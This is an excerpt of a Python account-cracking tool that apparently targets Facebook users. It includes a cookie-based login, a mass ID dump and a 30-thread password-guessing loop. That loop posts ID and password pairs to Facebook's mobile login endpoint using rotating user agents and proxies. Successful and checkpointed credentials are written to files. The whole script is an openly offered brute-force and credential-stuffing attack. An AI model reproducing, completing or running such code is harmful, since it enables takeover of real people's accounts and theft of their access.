...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© EXTENSION : [green]COOKIES[white] ©©©'))
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN OK RUN TOOL AGAIN!!!!{x} ');time.sleep(1)
...
def menu(my_name,my_id):
	...
	if _____cowok__pink_____ in ['1']:
		...
		print('—> Succesfully loged out + Cookie ')
		exit()
	else:
...
def dump_massal():
	...
	try:
		print('')
		cetak(nel(f'[★]{h} TOTAL {x}{h}'+str(len(id))))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] CRACK RESULT[cyan] ✓[white] '))
	print(f' {b}╰─>{x} {h} OK : {h}%s '%(ok))
	print(f'{x} {k}╰─>{x} {k} CP : {k}%s{x} '%(cp))
	print('')
	print('—> WILL YOU CRACK AGAIN ( Y/N ) ? ')
	woi = input('—> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}EDDY  {P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     😴😭ON AND OFF FLIGHT MODE THEN LOGIN😭😴[red]'))
				...
				cetak(nel('[green]      🎀🤣 CONFIDENCE AT WORK 🤣🎀[green]')) 
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[EDDY]  {P}⟨{b}{loop}{P}/{u}{len(id)}{P}⟩<—>{P}[{b}{ok}{P}]<—>{P}[{k}{cp}{x}]<—>[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ð­ MOHON MAAF ANDA BELUM BERUNTUNG MOHON BERSABAR ð­[red]'))
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
